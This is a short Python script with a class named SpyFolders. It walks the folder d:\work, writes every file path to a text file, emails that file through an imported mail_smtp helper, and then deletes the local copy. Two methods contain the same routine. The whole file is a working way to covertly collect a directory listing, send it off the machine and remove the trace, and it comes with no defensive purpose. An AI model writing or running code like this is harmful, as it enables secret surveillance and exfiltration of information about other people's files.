#-*- coding: utf8 -*-
import os
import sys
import mail_smtp

class SpyFolders():
    
    def get_files_list_from_dir(self,dir,ext = None):
        allfiles = []
        needExtFilter = (ext != None)
        for root,dirs,files in os.walk(dir):
            for filespath in files:
                filespath = os.path.join(root,filespath)
                extension = os.path.splitext(filespath)[1][1:]
                if needExtFilter and extension in ext:
                    allfiles.append(filespath)
                elif not needExtFilter:
                    allfiles.append(filespath)
        return allfiles

    def main(self):
        os.chdir("d:"+os.sep+"work")
        filename = "d:/dircontents.txt"
        files = self.get_files_list_from_dir(os.getcwd())
        with open(filename,"a") as f:
            f.seek(0,0)
            for item in files:
                f.write('%s\n'%(item))
                
        mail_smtp.send_smtp_message("files list","files list",filename)
        if os.path.exists(filename):
            os.remove(filename)

    def get_files(self):
        os.chdir("d:"+os.sep+"work")
        filename = "d:/dircontents.txt"
        files = self.get_files_list_from_dir(os.getcwd())
        with open(filename,"a") as f:
            f.seek(0,0)
            for item in files:
                f.write('%s\n'%(item))
                
        mail_smtp.send_smtp_message("files list","files list",filename)
        if os.path.exists(filename):
            os.remove(filename)
        
        

if __name__ == "__main__":
    runner = SpyFolders()
    runner.main()
    #runner.debugFunction()

    sys.exit()
